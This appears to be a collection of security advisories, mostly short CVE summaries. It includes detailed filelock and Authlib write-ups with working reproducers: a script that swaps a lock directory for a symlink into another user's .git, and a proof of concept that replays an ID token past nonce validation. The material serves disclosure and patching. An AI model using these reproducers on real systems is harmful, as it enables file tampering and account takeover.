A flaw in Node.js Permission Model filesystem enforcement leaves `fs.realpathSync()` without the required read permission checks. This is an incomplete fix of CVE-2026-21715, which only covered `fs.realpathSync.native()`.

As a result, code running under `--permission` with restricted `--allow-fs-read` can still use `fs.realpathSync()` to check file existence, resolve symlink targets, and enumerate filesystem paths outside of permitted directories.

This vulnerability affects Node.js **26.x**, **24.x**, and **22.x**.

items.title: filelock: SoftReadWriteLock follows a lock tree swapped in after its first acquire and writes lock records into directories of the user running the lock
items.description:
`SoftReadWriteLock` (and `AsyncSoftReadWriteLock`, which wraps one) checks once per lock object, by name, that `<path>.rw`, `<path>.rw/gen` and `<path>.rw/holders` are real directories and not symbolic links (files that redirect to another path). It then keeps only a boolean. Every later record operation resolves the full path again, and `O_NOFOLLOW` (a flag that makes an open fail when the final name is a symbolic link) protects the last component only. Another local user (the other user below) who can write the directory holding the lock, or who created `<path>.rw` first in a sticky directory such as `/tmp` (the sticky bit is a directory flag that lets only a file's owner rename or remove it), can put a tree under that name whose `gen` or `holders` is a symbolic link into a directory of the user running the lock (the lock user below).

A long-running process of the lock user that has already passed the check then creates, renames over and deletes files there with the lock user's privileges, including in `0700` directories the other user cannot open. The names and bytes are filelock's own lock records, not chosen by the other user. The scanner's reproducer replaces `.git/HEAD` in the lock user's private repository so that `git status` fails. There is no race. Affected versions: filelock >= 4.1.0 and <= 4.2.0. Anthropic's OSS Scanner reported it in private as `ANT-2026-WXXRI4M4` [high, CWE-367], titled "SoftReadWriteLock follows gen dir swapped for a symlink after first acquire".

## Severity

**CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N, 3.3 (Low).**

`AV:L` (local): the other user needs an account on the same host. `AC:L` (low attack complexity): the swap happens between two acquisitions, with no race to win. `PR:L` (low privileges): a local user with ordinary privileges is enough. `UI:N` (no user interaction): the lock user's process acts on its own. `C:N` (no confidentiality impact): the other user learns nothing. `I:L` (low integrity impact): the lock user's process replaces a file named `HEAD`, creates `epoch` and generation records, and deletes files whose names match the protocol's patterns, in any directory the lock user can write, with the lock user's privileges. The other user does not choose the bytes, but the files are gone and the chosen directory (a git repository) stops working. `A:N` (no availability impact): the lock itself keeps working and the lock user's process does not stall. The scanner rated it high; we scored the vector for a lock user with ordinary privileges.

Classification from the external review: conditional security. It is a cross-user replacement of a cached `.rw` tree that redirects later writes of the lock user through an intermediate symbolic link. It needs a planted tree in sticky `/tmp` or a writable parent without the sticky bit. Scoring note: we rate integrity low rather than high. The bytes written through the swapped tree are filelock's own records, not content the other user chose, so the lower reading of the CVSS integrity metric applies.

## Scope and preconditions

- Trust boundary: the other party is a different local account with write access to the lock's parent directory. Without the sticky bit (a `0777` scratch or spool directory, or a group-writable project or cache directory shared with that account's group) write access alone is enough. The other user renames the lock user's own `0700` `<path>.rw` aside and puts its tree in place. In a sticky parent such as `/tmp` the extra precondition is that it created `<path>.rw` (with real `gen` and `holders` directories, mode `0777`) before the lock user's first acquire. `prepare()` accepts an existing tree whoever owns it, and the other user later replaces its own `gen` with a symbolic link. `fs.protected_symlinks=1` (a Linux setting that refuses to follow another user's symbolic link in a world-writable sticky directory) does not intervene, because the link sits inside the other user's own non-sticky `<path>.rw`, not in the sticky parent (the scanner ran with that setting).
- Lock user: any process that keeps one `SoftReadWriteLock` or `AsyncSoftReadWriteLock` object (a singleton per path by default) and acquires it more than once, or is waiting for it when the swap happens. A fresh process that meets the planted tree gets `RuntimeError`. Between two acquisitions there is no timing to win.
- Targets: any directory the lock user can write, on any filesystem. The other user needs only to know its path (`/home/victim/project/.git` in the reproducer, under a `0700` home directory the other user cannot open).
- Platform: observed on Linux. The code path is the same on every POSIX platform and on Windows, where a junction (a Windows directory that points at another directory) at a directory component plays the symbolic link's part. The scanner ran Linux only.
- Ancestor boundary: protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That is the case when each ancestor belongs to the lock user or root and is either not writable by others or sticky. A user who can rename entries in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.

## Affected code

At the scanned commit `b831496b0273`, [`OsFiles.prepare` checks the three directories with `lstat` and caches `_prepared`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L121-L133). `lstat` reports what a name is without following a symbolic link. Every later operation takes a full path string, for example [`create`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L53-L60) (`O_NOFOLLOW` on the last component only), [`replace`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L86-L92) (`Path(source).replace(target)`), [`unlink`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L104-L112) and [`listdir`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_storage.py#L114-L119). The callers that write through the swapped tree are [`Participant.publish` / `_create_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L435-L445), [`GenerationLog._incarnation`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L282-L295) (creates `epoch`), [`commit`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L344-L360) (links a generation record and renames over `HEAD`), [`_keep_claim_fresh`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L487-L496), [`_sweep`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L498) and [`_list`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_protocol.py#L297) (unlink). There is one `OsFiles` per lock object ([`_sync.py` line 204](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_sync.py#L204)), handed to every `Participant` at [line 501](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft_rw/_sync.py#L501).

## Introduced

The once-per-object shortcut (`_prepared`) came with `367b111` ("fix(soft-rw): publish the head through gen/HEAD (#799)", 2026-10-08), first released in 4.1.0 (verified with `git tag --contains 367b111`, which answers 4.1.0). That commit opens the route between two acquisitions with no timing to win. The check-then-use gap itself is older. At its parent `61582c5` (also first in 4.1.0) a contender already waiting during the swap still creates `epoch` in the target before the lock refuses it, while 4.0.0 leaves the target untouched in the same test. The group advisory carried `>= 4.0.0` as the union with a sibling finding; for this finding alone the range is `>= 4.1.0, <= 4.2.0`.

## Mechanism

`prepare()` runs `mkdir(mode=0o700)` and then `lstat()` on each of `<path>.rw`, `gen` and `holders`. It raises `RuntimeError("... exists but is not a directory or is a symlink; refusing to use it")` for a symbolic link or non-directory. It does this by name, once per `OsFiles` (`if self._prepared and not force: return`), and only a `FileNotFoundError` while creating the holder record (the file that says this process holds or wants the lock) leads to `prepare(force=True)`. All other `OsFiles` methods (`read`, `create`, `link`, `replace`, `overwrite`, `unlink`, `listdir`) take a full path string such as `/srv/shared/app.lock.rw/gen/HEAD`. `O_NOFOLLOW` applies to `HEAD`, and the kernel follows `app.lock.rw` and `gen` to whatever they name at that moment. The gap between the check and a use is therefore as long as the process keeps the lock object.

The scanner observed this at the scanned commit on Linux 6.1, CPython 3.14.8, overlayfs, with a default-options `SoftReadWriteLock`, as two accounts in `/srv/shared` (root-owned, mode `0777`, no sticky bit):

1. `victim` runs a worker that builds `SoftReadWriteLock("/srv/shared/app.lock")` once and takes `write_lock()` for each job. After the first job, `app.lock.rw` exists, owned by `victim`, mode `0700`.
2. `attacker` renames `app.lock.rw` to `app.lock.rw.aside`, creates a new `app.lock.rw` with a world-writable `holders/` in it, and makes `app.lock.rw/gen` a symbolic link to `/home/victim/project/.git`. `/home/victim/project` is mode `0700`; the `attacker` account cannot open anything below it.
3. The worker takes the lock for its second job. `write_lock()` returns without error. `/home/victim/project/.git` now holds new files `epoch`, `00000000000000000001` and `00000000000000000002`, and `<epoch>\nfilelock-rw/1\ngeneration=2\n` has replaced the content of `.git/HEAD`. `git status` there answers `fatal: not a git repository`.

The second acquisition, step by step: `Participant.publish()` calls `prepare()`, which returns at once, then creates `holders/<token>`. The planted tree has a writable `holders`, so this succeeds. `advance()` calls `GenerationLog.latest()` (the generation log is the lock's ordered record of write generations under `gen/`). `_incarnation()` reads `gen/epoch`, finds none behind the link, and creates `.git/epoch`. The epoch differs from the remembered one, so the code drops the remembered log. git's `HEAD` does not start with the new epoch, so `_head_record()` ignores it and the log reads as empty. `commit()` creates `.git/.commit-<token>`, hard-links it (a hard link is a second name for the same file) to `.git/00000000000000000001`, removes the temporary name, and publishes `HEAD` through `OsFiles.replace`, which is `rename(".git/.commit-<token>", ".git/HEAD")`. The release commits generation 2 the same way and renames over `HEAD` again.

Other ways into the same gap exist. The scanner ran each at this commit with a directory only the lock user can access as the link target. A contender already waiting when the swap happens recreates its missing holder record in the planted `holders/` on its next poll (`_keep_claim_fresh()`), and the commit that follows replaces `HEAD` in the target. A process that only holds and releases, with the tree swapped during the hold, creates `epoch` in the target on release. With `holders` as the link, `Participant._sweep()` (run on acquire polls and from a holder's `heartbeat()`) unlinks files in the target whose names are 32 lowercase hex digits once the lock object has seen them unchanged for `stale_threshold` (observed with `stale_threshold=2`; the default is 90 s). With `gen` as the link, `GenerationLog._list()` unlinks every 20-digit name except the 64 highest: of 70 such files, it removes the 6 lowest before the acquire fails with `SoftFileLockProtocolError`.

## Reproduction

The scanner's reproducer for finding `ANT-2026-WXXRI4M4`, as received, ran against commit b831496b0273ecd11bf02b8d080ca8b673a538c1. The `repro` script drives the files under `repro.d/`.

**`repro`**

```python
#!/usr/bin/env python3
import os
import shutil
import subprocess
import sys
from pathlib import Path

SHARED = "/srv/shared"
LOCK_TREE = f"{SHARED}/app.lock.rw"
PROJECT = "/home/victim/project"
HEAD = Path(PROJECT, ".git", "HEAD")
AS_VICTIM = ["runuser", "-u", "victim", "--"]
AS_ATTACKER = ["runuser", "-u", "attacker", "--"]
VICTIM_WORKER = [*AS_VICTIM, sys.executable, "/tmp/repro.d/victim_worker.py"]
ATTACKER_SWAP_TREE = [*AS_ATTACKER, sys.executable, "/tmp/repro.d/attacker_swap_tree.py"]

# set up: a lock directory anyone may write (0777, no sticky bit), and a git repository only the victim can enter
shutil.rmtree(SHARED, ignore_errors=True)
shutil.rmtree(PROJECT, ignore_errors=True)
os.mkdir(SHARED)
os.chmod(SHARED, 0o777)
subprocess.run([*AS_VICTIM, "git", "init", "--quiet", PROJECT], check=True)
os.chmod(PROJECT, 0o700)
head_before = HEAD.read_text()
print("SETUP    HEAD:", repr(head_before))

attacker_opens_head = subprocess.run(
    [*AS_ATTACKER, sys.executable, "-c", f"open({str(HEAD)!r}, 'w')"], capture_output=True, text=True
)
if attacker_opens_head.returncode == 0:
    sys.exit("setup: the attacker can write HEAD directly")
print("CONTROL  attacker opens HEAD for writing:", attacker_opens_head.stderr.strip().splitlines()[-1])

# the victim's long-lived worker does job 1; its lock object creates and checks app.lock.rw
worker = subprocess.Popen(VICTIM_WORKER, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
worker.stdin.write("job 1\n")
worker.stdin.flush()
print("VICTIM  ", worker.stdout.readline().strip())
tree = os.stat(LOCK_TREE)
print("VICTIM   app.lock.rw owner uid", tree.st_uid, "mode", oct(tree.st_mode & 0o777))

# attack: between two jobs, swap in a tree whose gen/ is a symlink to the victim's .git
subprocess.run(ATTACKER_SWAP_TREE, check=True)
print("ATTACK   app.lock.rw/gen ->", os.readlink(f"{LOCK_TREE}/gen"))

# control: a new lock object, in a new victim process, checks the planted tree and refuses it
fresh_worker = subprocess.run(VICTIM_WORKER, input="job 1\n", capture_output=True, text=True)
print("CONTROL  new worker:", (fresh_worker.stdout + fresh_worker.stderr).strip().splitlines()[-1])
print("CONTROL  HEAD after the new worker:", repr(HEAD.read_text()))

# the same worker does job 2 with the lock object that passed the check at job 1
worker.stdin.write("job 2\n")
worker.stdin.close()
print("VICTIM  ", worker.stdout.read().strip())
worker.wait()

# check: HEAD of the victim's private repository must still be git's own
head_after = HEAD.read_text()
print("OBSERVED HEAD:", repr(head_after))
print("OBSERVED .git:", sorted(os.listdir(HEAD.parent)))
git_status = subprocess.run([*AS_VICTIM, "git", "-C", PROJECT, "status"], capture_output=True, text=True)
print("OBSERVED git status:", (git_status.stdout + git_status.stderr).strip().splitlines()[0])
print("BUG" if head_after != head_before and "filelock-rw/1" in head_after else "OK")
```

**`repro.d/attacker_swap_tree.py`**

```python
import os

LOCK_TREE = "/srv/shared/app.lock.rw"
TARGET = "/home/victim/project/.git"  # below a 0700 directory: this user can neither list nor write it

# the victim's tree is 0700, but its name lives in /srv/shared, which this user may write (no sticky bit)
os.rename(LOCK_TREE, f"{LOCK_TREE}.aside")

os.umask(0)
os.mkdir(LOCK_TREE, 0o755)
os.mkdir(f"{LOCK_TREE}/holders", 0o777)  # writable, so the victim's holder record lands and nothing re-runs prepare()
os.symlink(TARGET, f"{LOCK_TREE}/gen")
```

**`repro.d/victim_worker.py`**

```python
import sys

from filelock import SoftReadWriteLock

lock = SoftReadWriteLock("/srv/shared/app.lock")
for job in sys.stdin:
    with lock.write_lock(timeout=30):
        ...  # the job's work on the shared resource
    print("victim: finished", job.strip(), "and released the lock", flush=True)
```

## Attack sequence

```mermaid
sequenceDiagram
    participant A as other local user
    participant W as worker of the lock user (one lock object)
    participant F as /srv/shared (0777, no sticky bit)
    participant T as /home/victim/project/.git (0700)
    rect rgb(255, 214, 214)
        Note over A,T: filelock 4.1.0 to 4.2.0
        W->>F: job 1, write_lock() creates app.lock.rw (0700) with gen and holders, prepare() checks them once, _prepared = True
        W->>F: release, lock object kept
        A->>F: rename(app.lock.rw, app.lock.rw.aside)
        A->>F: mkdir app.lock.rw with a world-writable holders, symlink app.lock.rw/gen pointing at /home/victim/project/.git
        W->>F: job 2, prepare() returns at once, create(holders/token) succeeds in the planted holders
        W->>T: _incarnation() reads gen/epoch through the symlink, finds none, creates .git/epoch
        W->>T: commit() creates .git/.commit-token, links it to .git/00000000000000000001
        W->>T: replace() renames .git/.commit-token over .git/HEAD
        W->>T: release commits generation 2 and renames over HEAD again
        Note over W,T: write_lock() returned without error, HEAD is now a filelock-rw/1 record, git status says not a git repository
    end
```

## Evidence

The scanner's reproducer runs as root, drops to `victim` and `attacker` through `runuser`, needs `git`, changes no sysctl, and takes about half a second. It creates `/srv/shared` (root-owned, `0777`, no sticky bit), has `victim` run `git init /home/victim/project` and makes that directory `0700`. It then drives two programs. `victim_worker.py` holds one `SoftReadWriteLock("/srv/shared/app.lock")` with default options; for each line on stdin it takes `write_lock(timeout=30)`, releases it and prints `finished <job> and released the lock`. `attacker_swap_tree.py` renames the lock user's `app.lock.rw` aside, creates a new one with a world-writable `holders/`, and makes `app.lock.rw/gen` a symbolic link to `/home/victim/project/.git`, using only write access to `/srv/shared`. On the scanned commit it prints:

```
CONTROL  attacker opens HEAD for writing: PermissionError: [Errno 13] Permission denied: '/home/victim/project/.git/HEAD'
VICTIM   victim: finished job 1 and released the lock
VICTIM   app.lock.rw owner uid 1000 mode 0o700
ATTACK   app.lock.rw/gen -> /home/victim/project/.git
CONTROL  new worker: RuntimeError: /srv/shared/app.lock.rw/gen exists but is not a directory or is a symlink; refusing to use it
CONTROL  HEAD after the new worker: 'ref: refs/heads/master\n'
VICTIM   victim: finished job 2 and released the lock
OBSERVED HEAD: '<epoch>\nfilelock-rw/1\ngeneration=2\n'
OBSERVED .git: [..., 'epoch', '00000000000000000001', '00000000000000000002', ...]
OBSERVED git status: fatal: not a git repository
BUG
```

The `CONTROL` lines show that the other account cannot reach the repository itself and that a fresh lock object refuses the planted tree. The existing check works; the code does not repeat it for a live instance. The sticky-directory variant ends the same way, with `fs.protected_symlinks=1`. There the other account creates `app.lock.rw`, `gen` and `holders` with mode `0777` in a `1777` parent before the lock user's first acquire, then renames its own `gen` aside and links it to the lock user's `.git`.

Our verification: `BUG` on the scanned commit `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #842 stack head: `OK`, `HEAD` stays `ref: refs/heads/master`, `.git` keeps its original listing and `git status` answers `On branch master`. The result is the same with the stack's owner check disabled, so it does not depend on who owns the tree.

## Impact

With the lock user's privileges, in any directory the lock user can write, the other user gets a file named `HEAD` replaced, new files `epoch`, `HEAD` and 20-digit generation names created (mode `0600`), and files deleted whose names match the protocol's patterns (32 hex digits, 20 digits, `.commit-*`). The bytes written are filelock's own records, not chosen by the other user. Replacing `HEAD` makes a git repository unusable when the other user knows its path. Renaming `<path>.rw` away is something this other user may do anyway, and `docs/how-to.rst` documents the result (a new log starts). What this finding adds is that the lock user's file operations leave the lock's directory.

This is adjacent to GHSA-j8f7-rjxc-mr56 (`ReadWriteLock` following a symbolic link at its database path, fixed in 4.0.9) and the earlier symbolic link fixes (PR 461 for lock file creation, PR 465 for `SoftFileLock`, PR 565 for refreshing soft read/write lock markers). Each guards the final path component. Here the link sits at a directory component, which `O_NOFOLLOW` does not cover.

## Workarounds

- Keep the lock path in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share a `SoftReadWriteLock` between accounts through a `0777` or group-writable directory.
- In a sticky directory such as `/tmp`, make sure the locking account creates `<path>.rw` before anyone else can (for example at install time with mode `0700`), and do not use a lock path whose `<path>.rw` belongs to another account.
- Prefer a fresh lock object per unit of work over a long-lived singleton when other accounts can write the lock directory. A fresh object re-runs the directory check and refuses a planted tree.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/842

- 2026-10-16 00:46 UTC: draft advisory created
- 2026-10-16 01:39 UTC: fix PR #842 opened

vLLM before 0.31.0 contains a cross-request mask leak in InputBatch.condense() that allows remote attackers to constrain other clients' outputs by leaving stale allowed_token_ids rows. Attackers can submit concurrent constrained generate requests, including via unauthenticated /invocations, so recycled batch slots apply their token allowlist to victims' unrestricted requests.

Warpgate is an open source SSH, HTTPS, and MySQL bastion host for Linux. From 0.21.0 until 0.29.0, the Kubernetes request correlator in warpgate-protocol-kubernetes/src/correlator.rs keys an authorized AdmittedTarget by username, target_name, and client IP rather than by the immutable user UUID, while KubernetesSessionHandle::close does not evict the entry. If an account is deleted and a different low-privilege account is created with the same username, the replacement account can successfully authenticate as that recreated username and reuse the predecessor's still-live correlation entry when requesting the same target from the same client IP before kubernetes.session_max_age expires. Current-request authentication still occurs, but the reused entry bypasses a fresh target authorization check and can cause Warpgate to proxy requests with Kubernetes target credentials that the replacement account is not authorized to use, exposing cluster resources or permitting unauthorized mutations. This issue is fixed in version 0.29.0.

Unconstrained S3 endpoint settings in Elasticsearch ES|QL data sources can cause requests containing storage credentials to be sent to an attacker-controlled host. A user with data-source management privileges can configure a custom endpoint without the intended host restriction. On opted-in commercial Elastic Cloud Hosted deployments, the issue can also disclose workload-identity tokens and expose customer cloud resources outside Elasticsearch. Self-managed deployments are affected by the storage-endpoint path only.

items.title: Authlib: ID token can disable its own nonce validation via the nonce_supported claim
items.description:
### Summary

`OpenIDMixin.parse_id_token()` reads the `nonce_supported` claim from the ID token it is validating. When that claim is boolean `false`, the expected nonce is set to `None` and nonce validation is skipped for that token.

An ID token that carries this claim is therefore accepted in a session whose nonce does not match. A captured, validly signed ID token belonging to a victim can be replayed into an attacker-controlled session, authenticating the attacker as the victim at the relying party.

The code is identical in `authlib/integrations/base_client/sync_openid.py:82-83` and `authlib/integrations/base_client/async_openid.py:84-85`, so all framework integrations are affected. Fixed versions: none; reproduced on 1.8.0 (commit c529a61a).
  
Preconditions: the ID token must carry a valid signature and pass `iss` and `aud` validation, and the attacker must be able to supply it to `parse_id_token()`. Authorization code flow is not affected. Implicit and hybrid relying parties, and applications calling `parse_id_token()` directly, are affected.

### Details

## Affected code

`authlib/integrations/base_client/sync_openid.py:80-85`, in `parse_id_token()`:

```python
claims = claims_cls(token.claims, token.header, claims_options, claims_params)
# https://github.com/authlib/authlib/issues/259
if claims.get("nonce_supported") is False:
    claims.params["nonce"] = None

claims.validate(leeway=leeway)
```

`authlib/integrations/base_client/async_openid.py:82-86` contains the same code.

## Source of the claim

`claims` is constructed from `token.claims`, which is the decoded payload of the ID token passed to `parse_id_token()`:

```python
token = jwt.decode(
    token["id_token"],
    key=key_set,
    registry=JWSRegistry(algorithms=alg_values, strict_check_header=False),
)
...
claims = claims_cls(token.claims, token.header, claims_options, claims_params)
```

`claims.get("nonce_supported")` therefore resolves against the ID token payload. It is not read from `load_server_metadata()`, from client configuration, or from any other source under the relying party's control.

## Effect on validation

`IDToken.validate_nonce()` at `authlib/oidc/core/claims.py:69-83` performs the comparison only when the expected value is truthy:

```python
nonce_value = self.params.get("nonce")
if nonce_value:
    if "nonce" not in self:
        raise MissingClaimError("nonce")
    if nonce_value != self["nonce"]:
        raise InvalidClaimError("nonce")
```

Assigning `claims.params["nonce"] = None` makes `nonce_value` falsy, so both the presence check and the equality check are skipped. No error is raised and `claims.validate()` completes normally.

The docstring of that same method states the requirement:

> If present in the ID Token, Clients MUST verify that the nonce Claim Value is equal to the value of the nonce parameter sent in the Authentication Request.

## Trigger condition

The comparison is `is False`, so only a JSON boolean `false` activates the branch. A string value `"false"` does not, and nonce validation proceeds normally in that case.

## Origin

The branch was added in commit `3ca7333c` ("Skip verifying nonce for Apple case") to accommodate a provider that emits a `nonce_supported` claim, as referenced by the inline comment pointing to issue #259.

## Remediation

Read the flag from server metadata or client configuration rather than from the token:

```python
metadata = self.load_server_metadata()
if metadata.get("nonce_supported") is False:
    claims.params["nonce"] = None
```

This preserves the behavior for relying parties configured against a provider that does not support nonces, while preventing the token from determining whether it is subject to nonce validation.

### Proof of concept

## Environment

- authlib 1.8.0, commit `c529a61a` (tag `v1.8.0`)
- Python 3.14
- joserfc 1.7.5
- No network access required

```
git clone https://github.com/authlib/authlib.git && cd authlib
git checkout c529a61a
python3 -m venv .venv
.venv/bin/pip install -e . joserfc==1.7.5
.venv/bin/python poc.py
```

## Configuration

The relying party is a subclass of the shipped `OpenIDMixin` supplying only `client_id` and `load_server_metadata()`. `fetch_jwk_set()` returns `metadata["jwks"]` directly when the key set is present in metadata, so no HTTP request is made and no part of the validation path is stubbed.

The signing key is a generated RSA key. All three tokens are signed with it, carry `iss` and `aud` matching the relying party configuration, and are within their validity window. The relying party's session nonce is `nonce-the-rp-actually-generated`; every token carries the different nonce `nonce-from-the-captured-token`.

## poc.py

```python
from joserfc import jwt
from joserfc.jwk import RSAKey
from authlib.integrations.base_client.sync_openid import OpenIDMixin

ISSUER = "https://as.example"
CLIENT_ID = "rp-client"
KEY = RSAKey.generate_key(2048, parameters={"kid": "k1"})
JWKS = {"keys": [KEY.as_dict(private=False)]}


class RP(OpenIDMixin):
    client_id = CLIENT_ID

    def load_server_metadata(self):
        return {"issuer": ISSUER, "jwks": JWKS}


def id_token(nonce, sub="victim", nonce_supported=None):
    claims = {"iss": ISSUER, "sub": sub, "aud": CLIENT_ID,
              "iat": 1000000000, "exp": 4000000000, "auth_time": 1000000000}
    if nonce is not None:
        claims["nonce"] = nonce
    if nonce_supported is not None:
        claims["nonce_supported"] = nonce_supported
    return jwt.encode({"alg": "RS256", "kid": "k1"}, claims, KEY)


rp = RP()
SESSION_NONCE = "nonce-the-rp-actually-generated"
CAPTURED_NONCE = "nonce-from-the-captured-token"

cases = [
    ("[1] no nonce_supported claim", None),
    ("[2] nonce_supported: false", False),
    ("[3] nonce_supported: \"false\"", "false"),
]

for label, flag in cases:
    tok = {"access_token": "AT",
           "id_token": id_token(CAPTURED_NONCE, nonce_supported=flag)}
    try:
        user = rp.parse_id_token(tok, nonce=SESSION_NONCE)
        print(f"{label:34s} -> ACCEPTED sub={user['sub']}")
    except Exception as e:
        print(f"{label:34s} -> REJECTED {type(e).__name__}: {e}")
```

## Expected result

All three cases carry a nonce that does not match the relying party's session nonce, so all three should be rejected.

## Observed result

```
[1] no nonce_supported claim       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'
[2] nonce_supported: false         -> ACCEPTED sub=victim
[3] nonce_supported: "false"       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'
```

Case [1] shows nonce validation rejecting a mismatched nonce under normal conditions. Case [2] differs from case [1] only by the addition of the `nonce_supported` claim and is accepted, returning the subject of the replayed token. Case [3] confirms the branch requires a JSON boolean.

The script exits 0 and produces identical output across three runs.

### Impact

## Type of vulnerability

Reliance on an untrusted input in a security decision (CWE-807), resulting in authentication bypass by capture-replay (CWE-294).

The nonce binds an ID token to the browser session that requested it and is the control that prevents a token issued for one session being presented in another. Because the flag that governs this check is read from the token itself, the check can be disabled by the data it is applied to.

## Who is impacted

OpenID Connect relying parties built on authlib's client integrations where an attacker can supply an ID token to `parse_id_token()`:

- Implicit flow relying parties, where the ID token is returned in the URL fragment.
- Hybrid flow relying parties, where the ID token is returned in the fragment or by form post.
- Applications calling `parse_id_token()` directly on externally supplied input.

Both the synchronous and asynchronous integrations are affected, so Flask, Django and Starlette deployments are equally exposed.

Relying parties using plain authorization code flow are not impacted, as the ID token is retrieved from the token endpoint over TLS following a `state` lookup and cannot be substituted by an attacker.

## Consequence

An attacker in possession of a victim's ID token replays it into their own session. Nonce validation is skipped, `parse_id_token()` returns a `UserInfo` for the victim's subject, and the relying party establishes an authenticated session as the victim. This grants access to the victim's account at that relying party, including any data and actions available through it.

The token must carry a valid signature and pass `iss` and `aud` validation, so the vulnerability does not permit forging tokens or authenticating as an arbitrary subject. It removes the replay protection from a genuine token that has been captured, for example from browser history, a `Referer` header, proxy or server logs, or a shared device.

## Mitigation available to integrators

None. The check is performed inside `parse_id_token()`, and no parameter or configuration option is exposed to disable the behaviour or to override the nonce handling.

Kubeflow Pipelines enables users to build and deploy portable, scalable machine learning workflows. From 0.5.1 until 2.17.0, the frontend artifact routes did not check whether an authenticated user was authorized to access the requested namespace. A user who can reach the frontend and knows an artifact location can select another tenant's namespace, or omit the namespace and reach an unguarded direct handler, to read artifact contents such as datasets, models, or pipeline outputs. The issue applies to multi-user deployments that rely on Kubeflow Pipelines authorization for tenant isolation. Authentication at ingress identifies the caller but does not authorize access to the selected artifact namespace. The issue does not establish arbitrary Kubernetes Secret disclosure, storage modification, or server-side code execution. This issue is fixed in version 2.17.0.

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: Server: JSON).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.12, 9.7.0-9.7.3, 26.7.0-26.7.1; MySQL Cluster: 8.0.0-8.0.49, 8.4.0-8.4.12, 9.7.0-9.7.3 and  26.7.0-26.7.1. Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 6.5 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).

2FAuth is a web app to manage Two-Factor Authentication (2FA) accounts and generate their security codes. Prior to 8.0.0, the recipients() method in app/Api/v1/Controllers/TwoFAccountShareController.php receives a caller-selected TwoFAccount through Laravel model binding but does not call the manageShares authorization policy before listing its recipients. When account sharing is enabled, an authenticated user can call GET /api/v1/twofaccounts/{victimId}/recipients for accounts owned by other users, enumerate registered user IDs and display names, test exact email addresses with filter[nameOrEmail], and inspect each account's sharing relationships. This issue is fixed in version 8.0.0.

djangocms-versioning is a general-purpose versioning package for django CMS 4 and later. Prior to 2.6.1, the check_discard and check_edit_redirect Conditions on djangocms_versioning.models.Version omit user_can_change, while VersionAdmin.discard_view and VersionAdmin.edit_redirect_view obtain a version by its primary key and rely on those conditions for object-level authorization. With CMS_PERMISSION set to True, the affected views are gated only by is_staff, allowing any staff user to select content without object-level change permission. With the default CMS_PERMISSION value of False, a staff user must also hold the global Django change_ permission, but that model-level permission does not enforce the intended per-object authorization, so the user can delete a draft version and its content object through discard or create an editable draft from a published version through edit_redirect even when the user cannot change that specific content object. This issue is fixed in version 2.6.1.

Buffer over-read in PostgreSQL parallel B-tree scans allows an object creator to read attacker-chosen server-memory addresses, via a function incorrectly marked PARALLEL SAFE or STABLE to make participating workers build different scan-key arrays.  Within major versions 17-18, minor versions before PostgreSQL 18.7 and 17.12 are affected.  Versions before PostgreSQL 17 are unaffected.

An **expression language injection** has been found in the HeaderContentGuard.permit function in publication.py of the content guard in the **Pulpcore** package. The guard is supposed to check a value in a request header. It saves a jq filter and runs that filter against the header when a client asks for content. The filter is not limited to the header, and jq's env builtin also returns the environment of the content process. A low-privileged network attacker or user who can create a header content guard and attach it to a distribution can save a filter that reads that environment. The content request is allowed or denied according to the filter result. Repeating the request lets that attacker or user recover the environment, including Pulp settings held there, such as the Django secret key or the database password.

items.title: Microsoft Security Advisory CVE-2026-114157 - ASP.NET Core Security Feature Bypass Vulnerability
